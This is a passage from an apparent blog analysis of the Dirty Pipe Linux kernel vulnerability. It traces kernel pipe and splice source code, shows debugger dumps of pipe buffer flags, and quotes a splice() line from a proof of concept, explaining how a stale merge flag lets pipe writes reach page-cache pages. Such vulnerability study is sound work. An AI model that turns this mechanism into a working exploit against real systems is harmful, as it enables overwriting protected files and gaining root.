</span></span><span class=line><span class=cl>                <span class=n>chars</span> <span class=o>=</span> <span class=n>total_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>            <span class=n>written</span> <span class=o>=</span> <span class=nf>copy_page_to_iter</span><span class=p>(</span><span class=n>buf</span><span class=o>-&gt;</span><span class=n>page</span><span class=p>,</span> <span class=n>buf</span><span class=o>-&gt;</span><span class=n>offset</span><span class=p>,</span> <span class=n>chars</span><span class=p>,</span> <span class=n>to</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>            <span class=n>ret</span> <span class=o>+=</span> <span class=n>chars</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>buf</span><span class=o>-&gt;</span><span class=n>offset</span> <span class=o>+=</span> <span class=n>chars</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>buf</span><span class=o>-&gt;</span><span class=n>len</span> <span class=o>-=</span> <span class=n>chars</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>buf</span><span class=o>-&gt;</span><span class=n>len</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>pipe_buf_release</span><span class=p>(</span><span class=n>pipe</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>                <span class=n>tail</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>tail</span> <span class=o>=</span> <span class=n>tail</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>total_len</span> <span class=o>-=</span> <span class=n>chars</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>total_len</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>    <span class=cm>/* common path: read succeeded */</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>pipe_empty</span><span class=p>(</span><span class=n>head</span><span class=p>,</span> <span class=n>tail</span><span class=p>))</span>    <span class=cm>/* More to do? */</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>writers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>filp</span><span class=o>-&gt;</span><span class=n>f_flags</span> <span class=o>&amp;</span> <span class=n>O_NONBLOCK</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>ret</span> <span class=o>=</span> <span class=o>-</span><span class=n>EAGAIN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>ret</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>file_accessed</span><span class=p>(</span><span class=n>filp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L231 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>If the pipe is non-empty, the data is taken from the <code>tail</code>-indexed <code>pipe_buffer</code> (in <code>bufs</code>). In case, a buffer is emptied during a read, the <code>release</code> function pointer of the <code>ops</code> field of the <code>pipe_buffer</code> is executed. For a <code>pipe_buffer</code> that was initialized by an earlier <code>write()</code>, the <code>ops</code> field is a pointer to the <code>struct pipe_buf_operations anon_pipe_buf_ops</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=k>const</span> <span class=k>struct</span> <span class=n>pipe_buf_operations</span> <span class=n>anon_pipe_buf_ops</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>release</span>   <span class=o>=</span> <span class=n>anon_pipe_buf_release</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>try_steal</span> <span class=o>=</span> <span class=n>anon_pipe_buf_try_steal</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>get</span>       <span class=o>=</span> <span class=n>generic_pipe_buf_get</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L214 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * pipe_buf_release - put a reference to a pipe_buffer
</span></span></span><span class=line><span class=cl><span class=cm> * @pipe:    the pipe that the buffer belongs to
</span></span></span><span class=line><span class=cl><span class=cm> * @buf:    the buffer to put a reference to
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=nf>pipe_buf_release</span><span class=p>(</span><span class=k>struct</span> <span class=n>pipe_inode_info</span> <span class=o>*</span><span class=n>pipe</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=k>struct</span> <span class=n>pipe_buffer</span> <span class=o>*</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=k>struct</span> <span class=n>pipe_buf_operations</span> <span class=o>*</span><span class=n>ops</span> <span class=o>=</span> <span class=n>buf</span><span class=o>-&gt;</span><span class=n>ops</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>buf</span><span class=o>-&gt;</span><span class=n>ops</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>ops</span><span class=o>-&gt;</span><span class=nf>release</span><span class=p>(</span><span class=n>pipe</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L197 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>anon_pipe_buf_release</span><span class=p>(</span><span class=k>struct</span> <span class=n>pipe_inode_info</span> <span class=o>*</span><span class=n>pipe</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                  <span class=k>struct</span> <span class=n>pipe_buffer</span> <span class=o>*</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>page</span> <span class=o>*</span><span class=n>page</span> <span class=o>=</span> <span class=n>buf</span><span class=o>-&gt;</span><span class=n>page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * If nobody else uses this page, and we don&#39;t already have a
</span></span></span><span class=line><span class=cl><span class=cm>     * temporary page, let&#39;s keep track of it as a one-deep
</span></span></span><span class=line><span class=cl><span class=cm>     * allocation cache. (Otherwise just release our reference to it)
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>page_count</span><span class=p>(</span><span class=n>page</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>tmp_page</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>tmp_page</span> <span class=o>=</span> <span class=n>page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=nf>put_page</span><span class=p>(</span><span class=n>page</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L125 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>Thus, <code>anon_pipe_buf_release()</code> is executed, which calls <code>put_page()</code> to release our reference to the page. Note that while the <code>ops</code> pointer is set to NULL to signal that be buffer has been released, the <code>page</code> and <code>flags</code> fields of the <code>pipe_buffer</code> are left unmodified. It is thus the responsibility of code that might reuse a pipe buffer to initialize all its fields, otherwise the values are &ldquo;uninitialized&rdquo;. We can confirm this by printing the pipe structures after the last read.</p><pre tabindex=0><code>struct pipe_inode_info at 0xffff8881044aec00
&gt; &#39;head&#39;: 1
&gt; &#39;tail&#39;: 1
&gt; &#39;ring_size&#39;: 1
&gt; &#39;bufs&#39;: 0xffff888101f8a180

struct pipe_buffer at 0xffff888101f8a180
&gt; &#39;page&#39;: 0xffffea00040e3bc0
&gt; &#39;offset&#39;: 4096
&gt; &#39;len&#39;: 0
&gt; &#39;ops&#39;: NULL
&gt; &#39;flags&#39;: PIPE_BUF_FLAG_CAN_MERGE
</code></pre><h3 id=summary>Summary</h3><p>For us, the key takeaways are:</p><ol><li>Writes to a pipe can append to the <code>page</code> of a <code>pipe_buffer</code> if its <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag is set.</li><li>This flag is set by default for buffers that are initialized by writes.</li><li>Emptying a pipe with a <code>read()</code> leaves the <code>pipe_buffer</code>s&rsquo; flags unmodified.</li></ol><p>However, <code>write</code>s to a pipe are not the only way fill it!</p><h2 id=pipes-splicing>Pipes (splicing)</h2><p>Besides reading and writing, the Linux programming interface also offers the <code>splice</code> syscall for moving data from or to a pipe. This is what our PoC does next.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=nf>pause_for_inspection</span><span class=p>(</span><span class=s>&#34;About to splice() file to pipe&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>splice</span><span class=p>(</span><span class=n>tfd</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>pipefds</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L76 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>Since this syscall may not be as well-known as the others, let&rsquo;s briefly discuss it from a user&rsquo;s perspective.</p><h3 id=the-splice-system-call-user-land>The <code>splice</code> System Call (user land)</h3><pre tabindex=0><code>SPLICE(2)                       Linux Programmer&#39;s Manual                      SPLICE(2)

NAME
       splice - splice data to/from a pipe

SYNOPSIS
       #define _GNU_SOURCE         /* See feature_test_macros(7) */
       #include &lt;fcntl.h&gt;

       ssize_t splice(int fd_in, off64_t *off_in, int fd_out,
                      off64_t *off_out, size_t len, unsigned int flags);

DESCRIPTION
       splice()  moves  data between two file descriptors without copying between kernel
       address space and user address space.  It transfers up to len bytes of data  from
       the  file  descriptor  fd_in to the file descriptor fd_out, where one of the file
       descriptors must refer to a pipe.

       The following semantics apply for fd_in and off_in:
    
       *  If fd_in refers to a pipe, then off_in must be NULL.
    
       *  If fd_in does not refer to a pipe and off_in is NULL, then bytes are read from
          fd_in starting from the file offset, and the file offset is adjusted appropri‐
          ately.
    
       *  If fd_in does not refer to a pipe and off_in is not  NULL,  then  off_in  must
          point to a buffer which specifies the starting offset from which bytes will be
          read from fd_in; in this case, the file offset of fd_in is not changed.
    
       Analogous statements apply for fd_out and off_out.
</code></pre><p>As mentioned above, a process can obtain a file descriptor using the <code>sys_open</code> system call. If the process wishes to write the file content (or a part of it) into a pipe it has different options. It could <code>read()</code> the data from the file into a buffer in its memory (or <code>mmap()</code> the file) and then <code>write()</code> it to the pipe. However, this involves a total of three context switches (kernel-user-space boundary). To make this whole operation more efficient the Linux kernel implements the <code>sys_splice</code> system call. It essentially does the copying (not really a copy, see below) directly from one file descriptor to another one within the kernel space. As we will see, this makes a lot of sense because the content of a file or a pipe is already present in the kernel memory as a buffer or page or another structure.
One of <code>fd_in</code> or <code>fd_out</code> must be a pipe. The other <code>fd_xxx</code> can be another pipe, a file, a socket, a block device, a character device. See Max Kellermann&rsquo;s original blog post for an example how splicing is used to optimize real-world software (and how this application lead him to finding this bug :) Check out <a href=https://web.archive.org/web/20130521163124/http://kerneltrap.org/node/6505 target=_blank rel=noopener>this</a>
to read how Linus Torvalds himself explains the <code>splice</code> system call 8-)</p><h3 id=the-splice-system-call-implementation>The <code>splice</code> System Call (Implementation)</h3><p>The <em>very</em> high level idea of the <code>splice</code> implementation is illustrated in the following figure. After splicing, both, the pipe and the page cache, have different views of the same underlying data in memory. <em>You might want to open this SVG image in a new tab and zoom in a bit.</em><div class=not-prose><figure><img src=/2022/06/pipe_and_page_cache.svg alt="Pipe and Page Cache Overview" loading=lazy></figure></div></p><p>To see that this figure is correct, we start from the system call&rsquo;s entry point <code>SYSCALL_DEFINE6(splice,...)</code>, and first arrive at the function <code>__do_splice()</code> that is responsible for copying the offset values from and to user space. The called function <code>do_splice()</code> determines if we want to splice to, from or between pipes. In the first case the function</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>long</span> <span class=nf>do_splice_to</span><span class=p>(</span><span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>in</span><span class=p>,</span> <span class=kt>loff_t</span> <span class=o>*</span><span class=n>ppos</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=k>struct</span> <span class=n>pipe_inode_info</span> <span class=o>*</span><span class=n>pipe</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>);</span>
</span></span></code></pre></div><p>is called, which executes</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>in</span><span class=o>-&gt;</span><span class=n>f_op</span><span class=o>-&gt;</span><span class=nf>splice_read</span><span class=p>(</span><span class=n>in</span><span class=p>,</span> <span class=n>ppos</span><span class=p>,</span> <span class=n>pipe</span><span class=p>,</span> <span class=n>len</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/splice.c#L773 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>From here on, the execution path depends on the type of file we want to splice to the pipe. Since our target is a regular file and our VM uses the <code>ext2</code> file system, the correct implementation is found in <code>ext2_file_operations</code>. Note: If you debug the exploit on another machine with e.g. ext4 file system, feel free to follow this path&mldr; we&rsquo;ll meet again later ;) If you interested in this nice abstraction check out the <a href=https://www.kernel.org/doc/html/latest/filesystems/vfs.html target=_blank rel=noopener>Linux Virtual File System</a>
documentation.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>const</span> <span class=k>struct</span> <span class=n>file_operations</span> <span class=n>ext2_file_operations</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>read_iter</span>      <span class=o>=</span> <span class=n>ext2_file_read_iter</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>splice_read</span>    <span class=o>=</span> <span class=n>generic_file_splice_read</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/ext2/file.c#L182 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>Calling <code>generic_file_splice_read()</code> (eventually&mldr;) leads us to <code>filemap_read()</code>. Notice that at this point we switch from the file system <code>fs/</code> into the <a href=https://www.kernel.org/doc/html/latest/core-api/mm-api.html target=_blank rel=noopener>memory management</a>
<code>mm/</code> subsystem of the kernel.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * filemap_read - Read data from the page cache.
</span></span></span><span class=line><span class=cl><span class=cm> * @iocb: The iocb to read.
</span></span></span><span class=line><span class=cl><span class=cm> * @iter: Destination for the data.
</span></span></span><span class=line><span class=cl><span class=cm> * @already_read: Number of bytes already read by the caller.
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> * Copies data from the page cache.  If the data is not currently present,
</span></span></span><span class=line><span class=cl><span class=cm> * uses the readahead and readpage address_space operations to fetch it.
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> * Return: Total number of bytes copied, including those already read by
</span></span></span><span class=line><span class=cl><span class=cm> * the caller.  If an error happens before any bytes are copied, returns
</span></span></span><span class=line><span class=cl><span class=cm> * a negative error number.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>filemap_read</span><span class=p>(</span><span class=k>struct</span> <span class=n>kiocb</span> <span class=o>*</span><span class=n>iocb</span><span class=p>,</span> <span class=k>struct</span> <span class=n>iov_iter</span> <span class=o>*</span><span class=n>iter</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>ssize_t</span> <span class=n>already_read</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>filp</span> <span class=o>=</span> <span class=n>iocb</span><span class=o>-&gt;</span><span class=n>ki_filp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>file_ra_state</span> <span class=o>*</span><span class=n>ra</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>filp</span><span class=o>-&gt;</span><span class=n>f_ra</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>address_space</span> <span class=o>*</span><span class=n>mapping</span> <span class=o>=</span> <span class=n>filp</span><span class=o>-&gt;</span><span class=n>f_mapping</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>inode</span> <span class=o>*</span><span class=n>inode</span> <span class=o>=</span> <span class=n>mapping</span><span class=o>-&gt;</span><span class=n>host</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>folio_batch</span> <span class=n>fbatch</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>        <span class=nf>folio_batch_init</span><span class=p>(</span><span class=o>&amp;</span><span class=n>fbatch</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>        <span class=n>error</span> <span class=o>=</span> <span class=nf>filemap_get_pages</span><span class=p>(</span><span class=n>iocb</span><span class=p>,</span> <span class=n>iter</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fbatch</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nf>folio_batch_count</span><span class=p>(</span><span class=o>&amp;</span><span class=n>fbatch</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>struct</span> <span class=n>folio</span> <span class=o>*</span><span class=n>folio</span> <span class=o>=</span> <span class=n>fbatch</span><span class=p>.</span><span class=n>folios</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=kt>size_t</span> <span class=n>fsize</span> <span class=o>=</span> <span class=nf>folio_size</span><span class=p>(</span><span class=n>folio</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=kt>size_t</span> <span class=n>offset</span> <span class=o>=</span> <span class=n>iocb</span><span class=o>-&gt;</span><span class=n>ki_pos</span> <span class=o>&amp;</span> <span class=p>(</span><span class=n>fsize</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=kt>size_t</span> <span class=n>bytes</span> <span class=o>=</span> <span class=kt>min_t</span><span class=p>(</span><span class=kt>loff_t</span><span class=p>,</span> <span class=n>end_offset</span> <span class=o>-</span> <span class=n>iocb</span><span class=o>-&gt;</span><span class=n>ki_pos</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                         <span class=n>fsize</span> <span class=o>-</span> <span class=n>offset</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=kt>size_t</span> <span class=n>copied</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>            <span class=n>copied</span> <span class=o>=</span> <span class=nf>copy_folio_to_iter</span><span class=p>(</span><span class=n>folio</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>bytes</span><span class=p>,</span> <span class=n>iter</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=n>already_read</span> <span class=o>+=</span> <span class=n>copied</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>iocb</span><span class=o>-&gt;</span><span class=n>ki_pos</span> <span class=o>+=</span> <span class=n>copied</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>ra</span><span class=o>-&gt;</span><span class=n>prev_pos</span> <span class=o>=</span> <span class=n>iocb</span><span class=o>-&gt;</span><span class=n>ki_pos</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>        <span class=nf>folio_batch_init</span><span class=p>(</span><span class=o>&amp;</span><span class=n>fbatch</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=nf>iov_iter_count</span><span class=p>(</span><span class=n>iter</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>iocb</span><span class=o>-&gt;</span><span class=n>ki_pos</span> <span class=o>&lt;</span> <span class=n>isize</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/mm/filemap.c#L2645 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>In this function the actual copying (again no real byte-for-byte copy&mldr; see below) of data from the page cache to the pipe takes place. In a loop, the data is copied in chunks by the call to <code>copy_folio_to_iter()</code>. Note that a <a href=https://lwn.net/Articles/849538/ target=_blank rel=noopener>folio</a>
is not quite the same as a page, but for our purposes this doesn&rsquo;t matter.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>copied</span> <span class=o>=</span> <span class=nf>copy_folio_to_iter</span><span class=p>(</span><span class=n>folio</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>bytes</span><span class=p>,</span> <span class=n>iter</span><span class=p>);</span>
</span></span></code></pre></div><p>Besides, however, that if we look closer at the implementation of this operation in <code>copy_page_to_iter_pipe()</code>, we notice that the data is not actually copied at all!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>size_t</span> <span class=nf>copy_page_to_iter_pipe</span><span class=p>(</span><span class=k>struct</span> <span class=n>page</span> <span class=o>*</span><span class=n>page</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>offset</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>bytes</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=k>struct</span> <span class=n>iov_iter</span> <span class=o>*</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>pipe_inode_info</span> <span class=o>*</span><span class=n>pipe</span> <span class=o>=</span> <span class=n>i</span><span class=o>-&gt;</span><span class=n>pipe</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>pipe_buffer</span> <span class=o>*</span><span class=n>buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>p_mask</span> <span class=o>=</span> <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>ring_size</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>i_head</span> <span class=o>=</span> <span class=n>i</span><span class=o>-&gt;</span><span class=n>head</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>size_t</span> <span class=n>off</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=n>off</span> <span class=o>=</span> <span class=n>i</span><span class=o>-&gt;</span><span class=n>iov_offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>bufs</span><span class=p>[</span><span class=n>i_head</span> <span class=o>&amp;</span> <span class=n>p_mask</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>off</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>offset</span> <span class=o>==</span> <span class=n>off</span> <span class=o>&amp;&amp;</span> <span class=n>buf</span><span class=o>-&gt;</span><span class=n>page</span> <span class=o>==</span> <span class=n>page</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=cm>/* merge with the last one */</span>
</span></span><span class=line><span class=cl>        <span class=n>buf</span><span class=o>-&gt;</span><span class=n>len</span> <span class=o>+=</span> <span class=n>bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span><span class=o>-&gt;</span><span class=n>iov_offset</span> <span class=o>+=</span> <span class=n>bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>goto</span> <span class=n>out</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>i_head</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>bufs</span><span class=p>[</span><span class=n>i_head</span> <span class=o>&amp;</span> <span class=n>p_mask</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>buf</span><span class=o>-&gt;</span><span class=n>ops</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>page_cache_pipe_buf_ops</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>get_page</span><span class=p>(</span><span class=n>page</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>buf</span><span class=o>-&gt;</span><span class=n>page</span> <span class=o>=</span> <span class=n>page</span><span class=p>;</span>
